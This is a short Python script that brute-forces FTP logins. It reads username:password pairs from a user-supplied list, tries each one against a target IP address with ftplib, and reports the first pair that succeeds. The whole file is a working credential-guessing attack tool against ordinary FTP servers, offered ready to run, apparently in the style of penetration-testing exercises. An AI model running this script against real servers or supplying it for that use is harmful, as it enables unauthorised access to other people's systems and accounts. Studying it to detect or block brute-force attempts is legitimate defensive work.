#!/usr/bin/python3
import ftplib


def bruteforcer(hostname,passFile):
	try:
		pF=open(passFile,"r")
	except:
		print("[!!] File path doesn't exist")
	for line in pF.readlines():
		username=line.split(":")[0]
		password=line.split(":")[1].strip("\n")
		print("[+] Trying "+username+"/"+password)
		try:
			ftp=ftplib.FTP(hostname)
			login=ftp.login(username,password)
			print("[+] Connection suceeded with "+username+"/"+password)
			ftp.quit()
			return
		except:
			pass
	print("[-] Password not in the list")


hostname=input("[*] IP Address: ")
passFile=input("[*] Path of the user/pass list: ")
bruteforcer(hostname,passFile)
